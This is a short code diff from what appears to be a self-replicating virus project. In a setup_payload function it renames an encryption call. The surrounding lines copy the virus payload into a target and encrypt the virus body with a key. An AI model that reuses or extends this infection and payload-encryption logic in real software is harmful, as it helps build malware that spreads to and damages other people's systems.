@@ -100,7 +100,7 @@ bool		setup_payload(const struct entry *clone_entry, const struct safe_pointer i
 
 	ft_memcpy(payload_location, (void *)famine_entry, payload_size);
 	ft_memcpy(constants_location, &constants, sizeof(constants));
-	encrypt(32, virus_location, constants.key, virus_size);
+	cypher(32, virus_location, constants.key, virus_size);
 
 	return true;
 }
